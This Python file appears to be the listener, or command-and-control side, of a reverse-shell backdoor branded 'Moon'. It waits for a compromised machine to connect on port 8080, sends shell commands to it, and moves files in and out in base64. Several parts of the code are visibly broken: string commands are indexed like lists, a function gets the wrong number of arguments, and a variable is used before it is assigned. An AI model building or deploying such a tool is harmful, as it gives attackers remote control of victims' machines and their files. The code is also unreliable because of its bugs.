import socket
import json
import base64
import subprocess
import pyfiglet
from colorama import *


def draw_logo(module):
    logo = pyfiglet.figlet_format("\t\t\t Moon", font="slant")
    logo = Fore.RED + logo + Style.RESET_ALL
    module = Fore.RED + f"{module}" + Style.RESET_ALL
    line = pyfiglet.figlet_format("[][][][][][][][]", font="digital")
    print(f"{logo}[:]>{module}<[:]\n{line}")


class Listener:
    def __init__(self, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.port = port
        self.host_name = socket.gethostname()

        listener.bind(("127.0.0.1", self.port))
        listener.listen(4)

        server_about = {
            "HostName": self.host_name,
            "Port": self.port
        }

        print("[+] Server info")
        for key in server_about:
            print(f"{key} <-> {server_about[key]}")

        print("\n[+] Waiting for incoming connection")
        self.connection, address = listener.accept()
        print(f"[+] Got a connection -> from :: {str(address)}")

    def reliable_send(self, data):
        json_data = json.dumps(data)
        json_data = json_data.encode("utf-8")
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def output(self, **kwargs):
        for object in kwargs:
            print("\n")
            if object == "S":
                print(f"[S:] -> {kwargs[object]}")

            elif object == "R":
                print("[R:] <- {")
                print(kwargs[object])
                print("}-...")

            elif object == "N":
                print(f"[N:] {kwargs[object]}")

            else:
                print(object,"-{\n", kwargs[object], "\n}")

    def execute_remotely(self, command):
        try:
            self.reliable_send(command)
            result = self.reliable_receive().encode("utf-8")
            result = result.decode("utf-8")
            return result
        except AttributeError:
            return f"[-] AttributeError in -> {command}"

    def read_file(self, path: str) -> str:
        with open(path, 'rb') as file:
            self.reliable_send(base64.b64encode(file.read()))
            return base64.b64encode(file.read())

    def write_file(self, path: str, content: base64) -> str:
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
        return f"[+] Upload successful -> {path}"

    def getCodeType(self):
        title = str(input("[!] title -> "))
        self.reliable_send(title)
        code_expm = self.reliable_receive()
        print("\n")
        print("[Choise Byte type]...")
        for i in code_expm:
            print(i)
        print("...[|||||||||||||||||]")

        code_type = str(input("[!] code type -> "))
        self.reliable_send(code_type)

    def run(self):
        try:
            self.getCodeType()

            while True:
                command = str(input(">> "))

                try:
                    if command[0] == "download":
                        print(f"[+] Downloading file as {command[1]}")
                        self.execute_remotely("download", [command[1]])
                        result = self.write_file(command[1], result)

                    if command[0] == "upload" and "[-] Error" not in result:
                        file_content = self.read_file(command[1])
                        command.append(file_content)

                except Exception:
                    result = "[-] Error during comand execution ::Server::"
                    print(result)

                result = self.execute_remotely(command)
                self.output(S=command, R=result)

        except KeyboardInterrupt:
            print("\n[-] Quiting")
            self.connection.close()
            exit()


if __name__ == "__main__":

    term: bool = True

    if term:
        subprocess.call("clear")
        draw_logo("kotoamatsukami")

    port = 8080
    listener = Listener(port)
    listener.run()